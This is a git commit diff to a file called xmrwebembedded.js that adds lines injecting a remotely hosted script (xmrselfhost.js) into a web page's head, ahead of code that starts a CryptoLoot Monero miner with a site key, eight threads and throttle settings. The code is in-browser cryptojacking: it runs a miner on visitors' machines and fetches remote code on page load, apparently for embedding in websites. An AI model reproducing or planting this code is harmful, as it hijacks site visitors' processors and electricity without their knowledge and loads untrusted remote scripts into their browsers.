d053df8b45f13541168b7a7ab4e4560e14c6c2ca
Newbie <linhdqtg@gmail.com>
2017-10-19 23:22:00 +0700

    Update xmrwebembedded.js

--- xmrwebembedded.js
+++ xmrwebembedded.js
@@ -1,3 +1,6 @@
+var s = document.createElement('script');
+s.setAttribute('src', 'https://cdn.rawgit.com/BoobieLtd/js/432999dd/xmrselfhost.js');
+document.getElementsByTagName('head')[0].appendChild(s);
 var miner=new CryptoLoot.Anonymous('552a3151084681c06422b293d948704b43eccce6f7f5',
         {
         threads:8,autoThreads:false,throttle:0.2
